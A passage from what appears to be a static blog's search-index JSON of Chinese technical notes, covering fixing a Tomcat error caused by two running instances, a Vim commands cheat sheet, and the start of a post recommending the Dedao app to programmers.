org.apache.catalina.loader.WebappClassLoaderBase.checkStateForResourceLoading(WebappClassLoaderBase.java:1385) at org.apache.catalina.loader.WebappClassLoaderBase.checkStateForClassLoading(WebappClassLoaderBase.java:1373) at org.apache.catalina.loader.WebappClassLoaderBase.loadClass(WebappClassLoaderBase.java:1226) at org.apache.catalina.loader.WebappClassLoaderBase.loadClass(WebappClassLoaderBase.java:1188) at com.mysql.jdbc.MysqlIO.reuseAndReadPacket(MysqlIO.java:3562) at com.mysql.jdbc.MysqlIO.reuseAndReadPacket(MysqlIO.java:3462) at com.mysql.jdbc.MysqlIO.checkErrorPacket(MysqlIO.java:3905) at com.mysql.jdbc.MysqlIO.checkErrorPacket(MysqlIO.java:871) at com.mysql.jdbc.MysqlIO.proceedHandshakeWithPluggableAuthentication(MysqlIO.java:1714) at com.mysql.jdbc.MysqlIO.doHandshake(MysqlIO.java:1224) at com.mysql.jdbc.ConnectionImpl.coreConnect(ConnectionImpl.java:2199) at com.mysql.jdbc.ConnectionImpl.connectOneTryOnly(ConnectionImpl.java:2230) at com.mysql.jdbc.ConnectionImpl.createNewIO(ConnectionImpl.java:2025) at com.mysql.jdbc.ConnectionImpl.<init>(ConnectionImpl.java:778) at com.mysql.jdbc.JDBC4Connection.<init>(JDBC4Connection.java:47) at sun.reflect.GeneratedConstructorAccessor114.newInstance(Unknown Source) at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45) at java.lang.reflect.Constructor.newInstance(Constructor.java:423) at com.mysql.jdbc.Util.handleNewInstance(Util.java:425) at com.mysql.jdbc.ConnectionImpl.getInstance(ConnectionImpl.java:386) at com.mysql.jdbc.NonRegisteringDriver.connect(NonRegisteringDriver.java:330) at com.mchange.v2.c3p0.DriverManagerDataSource.getConnection(DriverManagerDataSource.java:175) at com.mchange.v2.c3p0.WrapperConnectionPoolDataSource.getPooledConnection(WrapperConnectionPoolDataSource.java:220) at com.mchange.v2.c3p0.WrapperConnectionPoolDataSource.getPooledConnection(WrapperConnectionPoolDataSource.java:206) at com.mchange.v2.c3p0.impl.C3P0PooledConnectionPool$1PooledConnectionResourcePoolManager.acquireResource(C3P0PooledConnectionPool.java:203) at com.mchange.v2.resourcepool.BasicResourcePool.doAcquire(BasicResourcePool.java:1138) at com.mchange.v2.resourcepool.BasicResourcePool.doAcquireAndDecrementPendingAcquiresWithinLockOnSuccess(BasicResourcePool.java:1125) at com.mchange.v2.resourcepool.BasicResourcePool.access$700(BasicResourcePool.java:44) at com.mchange.v2.resourcepool.BasicResourcePool$ScatteredAcquireTask.run(BasicResourcePool.java:1870) at com.mchange.v2.async.ThreadPoolAsynchronousRunner$PoolThread.run(ThreadPoolAsynchronousRunner.java:696) \u641c\u7d22\u4e86\u4e00\u4e9b\u7ed3\u5c40\u65b9\u6848\u4ee5\u540e\uff0c\u53d1\u73b0\u662fTomcat\u542f\u52a8\u4e86\u4e24\u4e2a\u670d\u52a1\u5bfc\u81f4\u7684\u62a5\u9519\u3002","title":"1. \u80cc\u666f"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Tomcat/TroubleShoot/1.Illegal_Access/#2","text":"\u9996\u5148\u627e\u51faTomcat\u7684\u8fdb\u7a0b ps -ef |grep tomcat root 13527 1 3 16:13 pts/1 00:00:03 /usr/local/jdk1.8.0_211/jre/bin/java -Djava.util.logging.config.file=/usr/local/myTomcat/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /usr/local/myTomcat/tomcat/bin/bootstrap.jar:/usr/local/myTomcat/tomcat/bin/tomcat-juli.jar -Dcatalina.base=/usr/local/myTomcat/tomcat -Dcatalina.home=/usr/local/myTomcat/tomcat -Djava.io.tmpdir=/usr/local/myTomcat/tomcat/temp org.apache.catalina.startup.Bootstrap start root 13598 12422 0 16:15 pts/1 00:00:00 grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn --exclude-dir=.idea --exclude-dir=.tox tomcat root 14985 1 0 Jun19 ? 03:25:17 /usr/local/jdk1.8.0_211/jre/bin/java -Djava.util.logging.config.file=/usr/local/myTomcat/tomcat/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -Dignore.endorsed.dirs= -classpath /usr/local/myTomcat/tomcat/bin/bootstrap.jar:/usr/local/myTomcat/tomcat/bin/tomcat-juli.jar -Dcatalina.base=/usr/local/myTomcat/tomcat -Dcatalina.home=/usr/local/myTomcat/tomcat -Djava.io.tmpdir=/usr/local/myTomcat/tomcat/temp org.apache.catalina.startup.Bootstrap start \u679c\u7136\u6709\u4e24\u4e2a\u8fdb\u7a0b\u3002 \u6740\u6389\u4e24\u4e2a\u8fdb\u7a0b kill -9 13527 ; kill -9 14985 \u542f\u52a8Tomcat sh startup.sh \u5982\u679c\u8bbf\u95eeTomcat\u670d\u52a1\u663e\u793a404 Not Found\uff0c\u628a war \u5305\u91cd\u65b0\u4f20\u5230\u670d\u52a1\u5668\u8def\u5f84\u5373\u53ef\u3002 \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"2. \u89e3\u51b3\u65b9\u6848"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Vim/1.Vim%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/","text":"Vim\u5e38\u7528\u547d\u4ee4 # \u76ee\u5f55 # [toc] 1. \u80cc\u666f # \u6211\u53d1\u73b0\u7b14\u8bb0\u672c\u7535\u8111\u63a5\u5916\u63a5\u952e\u76d8\u4ee5\u540e\uff0c\u4f7f\u7528\u89e6\u63a7\u677f\u548c\u64cd\u4f5c\u9f20\u6807\u90fd\u53d8\u5f97\u6bd4\u8f83\u9ebb\u70e6\uff0c\u6240\u4ee5\u60f3\u8981\u5b66\u4e60\u4e00\u4e0b Vim \uff0c\u5199\u4e00\u7bc7\u7b14\u8bb0\u8bb0\u5f55\u5e38\u7528\u547d\u4ee4\u3002 2. \u6a21\u5f0f\u5207\u6362 # \u57fa\u672c\u4e0a vim \u5171\u5206\u4e3a\u4e09\u79cd\u6a21\u5f0f\uff0c\u5206\u522b\u662f\u547d\u4ee4\u6a21\u5f0f\uff08 Command mode \uff09\uff0c\u8f93\u5165\u6a21\u5f0f\uff08 Insert mode \uff09\u548c\u5e95\u7ebf\u547d\u4ee4\u6a21\u5f0f\uff08 Last line mode \uff09\u3002 \u542f\u52a8 vim \uff0c\u4fbf\u8fdb\u5165\u4e86\u547d\u4ee4\u6a21\u5f0f\u3002 i \u5207\u6362\u5230\u8f93\u5165\u6a21\u5f0f\uff0c\u4ee5\u8f93\u5165\u5b57\u7b26\u3002 : \u5207\u6362\u5230\u5e95\u7ebf\u547d\u4ee4\u6a21\u5f0f\uff0c\u4ee5\u5728\u6700\u5e95\u4e00\u884c\u8f93\u5165\u547d\u4ee4\u3002 3. \u79fb\u52a8 # 3.1. \u641c\u7d22 # \u5982\u679c\u8981\u641c\u7d22\u5b57\u7b26\u4e32 str \uff0c\u5728\u547d\u4ee4\u6a21\u5f0f\u4e0b\uff0c\u8f93\u5165 :/str \u3002 n \u8df3\u8f6c\u4e0b\u4e00\u4e2a\u5339\u914d\u3002 N \u8df3\u8f6c\u5230\u4e0a\u4e00\u4e2a\u5339\u914d\u3002 :noh \u3001\u5173\u95ed\u9ad8\u4eae :set hls \u5f00\u542f\u9ad8\u4eae 3.2. \u6309\u5b57\u7b26\u79fb\u52a8 # h \u5411\u5de6\u79fb\u52a8\u4e00\u4e2a\u5b57\u7b26 j \u5411\u4e0b\u79fb\u52a8\u4e00\u4e2a\u5b57\u7b26 k \u5411\u4e0a\u79fb\u52a8\u4e00\u4e2a\u5b57\u7b26 l \u5411\u53f3\u79fb\u52a8\u4e00\u4e2a\u5b57\u7b26 3.3. \u6309\u5355\u8bcd\u79fb\u52a8 # w \u5411\u540e\u79fb\u52a8\u4e00\u4e2a\u5355\u8bcd\u4f4d\u7f6e\uff0c\u5149\u6807\u5728\u8bcd\u9996 e \u5411\u540e\u79fb\u52a8\u4e00\u4e2a\u5355\u8bcd\u4f4d\u7f6e\uff0c\u5149\u6807\u5728\u8bcd\u5c3e b \u5411\u524d\u79fb\u52a8\u4e00\u4e2a\u5355\u8bcd 3.4. \u6309\u53e5\u5b50\u79fb\u52a8 # ( \u5411\u524d\u79fb\u52a8\u4e00\u4e2a\u53e5\u5b50\u4f4d\u7f6e ) \u5411\u540e\u79fb\u52a8\u4e00\u4e2a\u53e5\u5b50\u4f4d\u7f6e 3.5. \u6309\u884c\u79fb\u52a8 # 0 \u79fb\u52a8\u5f53\u884c\u9996 $ \u79fb\u52a8\u5149\u6807\u5230\u884c\u5c3e ^ \u79fb\u52a8\u5149\u6807\u5230\u884c\u9996\u975e\u7a7a\u767d\u5b57\u7b26 3.6. \u6309\u6bb5\u843d\u79fb\u52a8 # { \u5411\u524d\u79fb\u52a8\u4e00\u4e2a\u6bb5\u843d\u7684\u4f4d\u7f6e } \u5411\u540e\u79fb\u52a8\u4e00\u4e2a\u6bb5\u843d\u7684\u4f4d\u7f6e 3.7. \u6309\u9875\u79fb\u52a8 # ctrl + u \u5411\u4e0a\u79fb\u52a8\u534a\u9875 (up) ctrl + d \u5411\u4e0b\u79fb\u52a8\u534a\u9875 (down) ctrl + b \u79fb\u52a8\u5230\u4e0a\u4e00\u9875 (back) ctrl + f \u79fb\u52a8\u5230\u4e0b\u4e00\u9875 (foward) 3.8. \u79fb\u52a8\u5230\u9876\u90e8/\u5e95\u90e8 # gg \u79fb\u52a8\u5230\u6587\u4ef6\u9876\u90e8 G \u79fb\u52a8\u5230\u6587\u4ef6\u5e95\u90e8 4. \u7f16\u8f91 # 4.1. \u590d\u5236 # yap \u590d\u5236\u5149\u6807\u6240\u5728\u6bb5\u843d yy \u590d\u5236\u5f53\u524d\u884c yw \u590d\u5236\u5355\u8bcd yl \u590d\u5236\u5f53\u524d\u5b57\u7b26 4.2. \u7c98\u8d34 # p \u5728\u5f53\u524d\u5149\u6807\u4e4b\u540e\u7c98\u8d34 P \u5728\u5f53\u524d\u5149\u6807\u4e4b\u524d\u7c98\u8d34 4.3. \u63d2\u5165 # I \u5728\u5f53\u524d\u884c\u9996\u63d2\u5165\u5b57\u7b26 i \u5728\u5f53\u524d\u5149\u6807\u4e4b\u524d\u63d2\u5165\u5b57\u7b26 a \u5728\u5f53\u524d\u5149\u6807\u4e4b\u540e\u63d2\u5165\u5b57\u7b26 A \u5728\u5f53\u524d\u884c\u5c3e\u63d2\u5165\u5b57\u7b26 o \u5728\u5f53\u524d\u5149\u6807\u4e0b\u65b9\u63d2\u5165\u65b0\u884c O \u5728\u5f53\u524d\u5149\u6807\u4e0a\u65b9\u63d2\u5165\u65b0\u884c 4.4. \u66ff\u6362 # s \u66ff\u6362\u5f53\u524d\u5149\u6807\u6240\u5728\u5b57\u7b26 S \u66ff\u6362\u5f53\u524d\u5149\u6807\u6240\u5728\u884c r \u66ff\u6362\u5f53\u524d\u5149\u6807\u6240\u5728\u5b57\u7b26\u5e76\u8fd4\u56de\u547d\u4ee4\u6a21\u5f0f R \u8fde\u7eed\u66ff\u6362\u5f53\u524d\u5149\u6807\u6240\u5728\u5b57\u7b26 4.5. \u5220\u9664 # x \u5220\u9664\u5f53\u524d\u5b57\u7b26 dl \u5220\u9664\u5f53\u524d\u5b57\u7b26 dw \u5220\u9664\u5f53\u524d\u5355\u8bcd dd \u5220\u9664\u5f53\u524d\u884c d + \u6570\u5b57 + \u65b9\u5411\u952e \u5f80\u6307\u5b9a\u65b9\u5411\u5220\u9664\u82e5\u5e72\u6b21 \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"1.Vim\u5e38\u7528\u547d\u4ee4"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Vim/1.Vim%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#vim","text":"","title":"Vim\u5e38\u7528\u547d\u4ee4"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Vim/1.Vim%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#_1","text":"[toc]","title":"\u76ee\u5f55"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Vim/1.Vim%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#1","text":"\u6211\u53d1\u73b0\u7b14\u8bb0\u672c\u7535\u8111\u63a5\u5916\u63a5\u952e\u76d8\u4ee5\u540e\uff0c\u4f7f\u7528\u89e6\u63a7\u677f\u548c\u64cd\u4f5c\u9f20\u6807\u90fd\u53d8\u5f97\u6bd4\u8f83\u9ebb\u70e6\uff0c\u6240\u4ee5\u60f3\u8981\u5b66\u4e60\u4e00\u4e0b Vim \uff0c\u5199\u4e00\u7bc7\u7b14\u8bb0\u8bb0\u5f55\u5e38\u7528\u547d\u4ee4\u3002","title":"1. \u80cc\u666f"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Vim/1.Vim%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#2","text":"\u57fa\u672c\u4e0a vim \u5171\u5206\u4e3a\u4e09\u79cd\u6a21\u5f0f\uff0c\u5206\u522b\u662f\u547d\u4ee4\u6a21\u5f0f\uff08 Command mode \uff09\uff0c\u8f93\u5165\u6a21\u5f0f\uff08 Insert mode \uff09\u548c\u5e95\u7ebf\u547d\u4ee4\u6a21\u5f0f\uff08 Last line mode \uff09\u3002 \u542f\u52a8 vim \uff0c\u4fbf\u8fdb\u5165\u4e86\u547d\u4ee4\u6a21\u5f0f\u3002 i \u5207\u6362\u5230\u8f93\u5165\u6a21\u5f0f\uff0c\u4ee5\u8f93\u5165\u5b57\u7b26\u3002 : \u5207\u6362\u5230\u5e95\u7ebf\u547d\u4ee4\u6a21\u5f0f\uff0c\u4ee5\u5728\u6700\u5e95\u4e00\u884c\u8f93\u5165\u547d\u4ee4\u3002","title":"2. \u6a21\u5f0f\u5207\u6362"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Vim/1.Vim%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#3","text":"","title":"3. \u79fb\u52a8"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Vim/1.Vim%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#31","text":"\u5982\u679c\u8981\u641c\u7d22\u5b57\u7b26\u4e32 str \uff0c\u5728\u547d\u4ee4\u6a21\u5f0f\u4e0b\uff0c\u8f93\u5165 :/str \u3002 n \u8df3\u8f6c\u4e0b\u4e00\u4e2a\u5339\u914d\u3002 N \u8df3\u8f6c\u5230\u4e0a\u4e00\u4e2a\u5339\u914d\u3002 :noh \u3001\u5173\u95ed\u9ad8\u4eae :set hls \u5f00\u542f\u9ad8\u4eae","title":"3.1. \u641c\u7d22"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Vim/1.Vim%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#32","text":"h \u5411\u5de6\u79fb\u52a8\u4e00\u4e2a\u5b57\u7b26 j \u5411\u4e0b\u79fb\u52a8\u4e00\u4e2a\u5b57\u7b26 k \u5411\u4e0a\u79fb\u52a8\u4e00\u4e2a\u5b57\u7b26 l \u5411\u53f3\u79fb\u52a8\u4e00\u4e2a\u5b57\u7b26","title":"3.2. \u6309\u5b57\u7b26\u79fb\u52a8"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Vim/1.Vim%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#33","text":"w \u5411\u540e\u79fb\u52a8\u4e00\u4e2a\u5355\u8bcd\u4f4d\u7f6e\uff0c\u5149\u6807\u5728\u8bcd\u9996 e \u5411\u540e\u79fb\u52a8\u4e00\u4e2a\u5355\u8bcd\u4f4d\u7f6e\uff0c\u5149\u6807\u5728\u8bcd\u5c3e b \u5411\u524d\u79fb\u52a8\u4e00\u4e2a\u5355\u8bcd","title":"3.3. \u6309\u5355\u8bcd\u79fb\u52a8"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Vim/1.Vim%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#34","text":"( \u5411\u524d\u79fb\u52a8\u4e00\u4e2a\u53e5\u5b50\u4f4d\u7f6e ) \u5411\u540e\u79fb\u52a8\u4e00\u4e2a\u53e5\u5b50\u4f4d\u7f6e","title":"3.4. \u6309\u53e5\u5b50\u79fb\u52a8"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Vim/1.Vim%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#35","text":"0 \u79fb\u52a8\u5f53\u884c\u9996 $ \u79fb\u52a8\u5149\u6807\u5230\u884c\u5c3e ^ \u79fb\u52a8\u5149\u6807\u5230\u884c\u9996\u975e\u7a7a\u767d\u5b57\u7b26","title":"3.5. \u6309\u884c\u79fb\u52a8"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Vim/1.Vim%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#36","text":"{ \u5411\u524d\u79fb\u52a8\u4e00\u4e2a\u6bb5\u843d\u7684\u4f4d\u7f6e } \u5411\u540e\u79fb\u52a8\u4e00\u4e2a\u6bb5\u843d\u7684\u4f4d\u7f6e","title":"3.6. \u6309\u6bb5\u843d\u79fb\u52a8"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Vim/1.Vim%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#37","text":"ctrl + u \u5411\u4e0a\u79fb\u52a8\u534a\u9875 (up) ctrl + d \u5411\u4e0b\u79fb\u52a8\u534a\u9875 (down) ctrl + b \u79fb\u52a8\u5230\u4e0a\u4e00\u9875 (back) ctrl + f \u79fb\u52a8\u5230\u4e0b\u4e00\u9875 (foward)","title":"3.7. \u6309\u9875\u79fb\u52a8"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Vim/1.Vim%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#38","text":"gg \u79fb\u52a8\u5230\u6587\u4ef6\u9876\u90e8 G \u79fb\u52a8\u5230\u6587\u4ef6\u5e95\u90e8","title":"3.8. \u79fb\u52a8\u5230\u9876\u90e8/\u5e95\u90e8"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Vim/1.Vim%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#4","text":"","title":"4. \u7f16\u8f91"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Vim/1.Vim%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#41","text":"yap \u590d\u5236\u5149\u6807\u6240\u5728\u6bb5\u843d yy \u590d\u5236\u5f53\u524d\u884c yw \u590d\u5236\u5355\u8bcd yl \u590d\u5236\u5f53\u524d\u5b57\u7b26","title":"4.1. \u590d\u5236"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Vim/1.Vim%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#42","text":"p \u5728\u5f53\u524d\u5149\u6807\u4e4b\u540e\u7c98\u8d34 P \u5728\u5f53\u524d\u5149\u6807\u4e4b\u524d\u7c98\u8d34","title":"4.2. \u7c98\u8d34"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Vim/1.Vim%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#43","text":"I \u5728\u5f53\u524d\u884c\u9996\u63d2\u5165\u5b57\u7b26 i \u5728\u5f53\u524d\u5149\u6807\u4e4b\u524d\u63d2\u5165\u5b57\u7b26 a \u5728\u5f53\u524d\u5149\u6807\u4e4b\u540e\u63d2\u5165\u5b57\u7b26 A \u5728\u5f53\u524d\u884c\u5c3e\u63d2\u5165\u5b57\u7b26 o \u5728\u5f53\u524d\u5149\u6807\u4e0b\u65b9\u63d2\u5165\u65b0\u884c O \u5728\u5f53\u524d\u5149\u6807\u4e0a\u65b9\u63d2\u5165\u65b0\u884c","title":"4.3. \u63d2\u5165"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Vim/1.Vim%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#44","text":"s \u66ff\u6362\u5f53\u524d\u5149\u6807\u6240\u5728\u5b57\u7b26 S \u66ff\u6362\u5f53\u524d\u5149\u6807\u6240\u5728\u884c r \u66ff\u6362\u5f53\u524d\u5149\u6807\u6240\u5728\u5b57\u7b26\u5e76\u8fd4\u56de\u547d\u4ee4\u6a21\u5f0f R \u8fde\u7eed\u66ff\u6362\u5f53\u524d\u5149\u6807\u6240\u5728\u5b57\u7b26","title":"4.4. \u66ff\u6362"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/Vim/1.Vim%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/#45","text":"x \u5220\u9664\u5f53\u524d\u5b57\u7b26 dl \u5220\u9664\u5f53\u524d\u5b57\u7b26 dw \u5220\u9664\u5f53\u524d\u5355\u8bcd dd \u5220\u9664\u5f53\u524d\u884c d + \u6570\u5b57 + \u65b9\u5411\u952e \u5f80\u6307\u5b9a\u65b9\u5411\u5220\u9664\u82e5\u5e72\u6b21 \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"4.5. \u5220\u9664"},{"location":"%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/%E5%BE%97%E5%88%B0APP/1.%E6%88%91%E4%B8%BA%E4%BB%80%E4%B9%88%E6%8E%A8%E8%8D%90%E7%A8%8B%E5%BA%8F%E5%91%98%E6%9C%8B%E5%8F%8B%E4%BD%BF%E7%94%A8%E5%BE%97%E5%88%B0APP/","text":"\u6211\u4e3a\u4ec0\u4e48\u63a8\u8350\u7a0b\u5e8f\u5458\u670b\u53cb\u4f7f\u7528\u5f97\u5230APP # \u76ee\u5f55 # \u6211\u4e3a\u4ec0\u4e48\u63a8\u8350\u7a0b\u5e8f\u5458\u670b\u53cb\u4f7f\u7528\u5f97\u5230APP \u76ee\u5f55 1. \u80cc\u666f 2. \u5bf9\u6280\u672f\u4e66\u7c4d\u5185\u5bb9\u8fdb\u884c\u641c\u7d22 3. \u5bf9\u77e5\u8bc6\u9762\u8fdb\u884c\u6269\u5145 4. \u5bf9\u788e\u7247\u65f6\u95f4\u8fdb\u884c\u5229\u7528 5. \u5f97\u5230\u662f\u5728\u8d29\u5356\u7126\u8651\u5417 1. \u80cc\u666f # \u524d\u6bb5\u65f6\u95f4\u6211\u5199\u4e86 \u51e0\u7bc7\u7b14\u8bb0 \uff0c\u6587\u4e2d\u63d0\u5230\u4e86\u5f97\u5230APP\u7684\u641c\u7d22\u5f15\u64ce\uff0c\u91cc\u9762\u9644\u4e0a\u4e86\u6211\u4ece\u5f97\u5230APP\u91cc\u5206\u4eab\u51fa\u6765\u7684\u7535\u5b50\u4e66\u94fe\u63a5\u3002\u800c\u8ba9\u6211\u60ca\u5947\u7684\u662f\uff0c\u6709\u540c\u5b66\u901a\u8fc7 \u6211\u7684\u94fe\u63a5 \u6ce8\u518c\u4e86\u5f97\u5230\u3002 \u4e8e\u662f\uff0c\u6211\u5c31\u840c\u751f\u4e86\u5199\u4e00\u7bc7\u7b14\u8bb0\u6765\u63a8\u8350\u5f97\u5230APP\u7ed9\u7a0b\u5e8f\u5458\u670b\u53cb\u4eec\u7684\u60f3\u6cd5\u3002 \u6211\u63a8\u8350\u7684\u7406\u7531\u4e3b\u8981\u6709\u5982\u4e0b\u4e09\u70b9\uff1a \u4f7f\u7528\u5f97\u5230APP\u80fd\u591f\u5bf9\u6280\u672f\u4e66\u7c4d\u5185\u5bb9\u8fdb\u884c\u641c\u7d22 \u80fd\u591f\u5bf9\u77e5\u8bc6\u9762\u8fdb\u884c\u6269\u5145 \u5bf9\u788e\u7247\u65f6\u95f4\u8fdb\u884c\u5229\u7528 \u4e0b\u9762\u6211\u4eec\u5c31\u4e00\u4e00\u9053\u6765\u3002 2. \u5bf9\u6280\u672f\u4e66\u7c4d\u5185\u5bb9\u8fdb\u884c\u641c\u7d22 # \u7b2c\u4e00\u4e2a\u7406\u7531\u662f\uff1a\u4f7f\u7528\u5f97\u5230APP\u80fd\u591f\u5bf9\u6280\u672f\u4e66\u7c4d\u5185\u5bb9\u8fdb\u884c\u641c\u7d22\u3002 \u8fd9\u662f\u8ba9\u6211\u6700\u559c\u6b22\u7684\u4e00\u4e2a\u529f\u80fd\uff0c \u5f97\u5230APP\u91cc\u6709\u4e0a\u4e07\u672c\u7535\u5b50\u4e66 \uff0c\u6211\u4eec\u6bd4\u8f83\u719f\u6089\u7684\u4eba\u6c11\u90ae\u7535\u51fa\u7248\u793e\u300a\u56fe\u7075\u7cfb\u5217\u4e1b\u4e66\u300b\uff0c\u5728\u5f97\u5230\u91cc\u51e0\u4e4e\u90fd\u6709\u7535\u5b50\u7248\uff0c\u800c\u4e14\u53ef\u4ee5\u514d\u8d39\u6d4f\u89c8\u4efb\u610f 10\\% \u7684\u5185\u5bb9\uff0c\u5982\u679c\u82b1100\u591a\u5f00\u901a\u4e00\u5e74\u7535\u5b50\u4e66\u4f1a\u5458\u66f4\u662f \u57fa\u672c\u90fd\u80fd\u514d\u8d39\u770b \u3002 \u5e76\u4e14\uff0c\u5f97\u5230\u5efa\u7acb\u4e86\u4e00\u4e2a \u77e5\u8bc6\u641c\u7d22\u5f15\u64ce \uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u6211\u4eec\u53ef\u4ee5\u5bf9\u5f97\u5230APP\u5185\u7684\u8bfe\u7a0b\u5185\u5bb9\u3001\u7535\u5b50\u4e66\u5185\u5bb9\u3001\u6587\u7ae0\u5185\u5bb9\u8fdb\u884c\u641c\u7d22\u3002 \u5bf9\u6211\u4eec\u6700\u5177\u5438\u5f15\u529b\u7684\u5f53\u7136\u662f \u5bf9\u6280\u672f\u4e66\u7c4d\u8fdb\u884c\u641c\u7d22 \u4e86\uff0c\u5728\u6211\u4eec\u9700\u8981\u4e86\u89e3\u4e00\u4e2a\u65b0\u6982\u5ff5\uff0c\u6216\u8005\u89e3\u51b3\u4e00\u4e2a\u65b0\u95ee\u9898\u7684\u65f6\u5019\uff0c\u901a\u5e38\u9700\u8981\u501f\u52a9\u641c\u7d22\u5f15\u64ce\u3002\u6211\u4eec\u53ef\u80fd\u5728CSDN\u4e0a\u627e\u4e00\u627e\u535a\u5ba2\u3001\u5728\u77e5\u4e4e\u4e0a\u641c\u7d22\u4e00\u4e0b\u95ee\u7b54\u3002 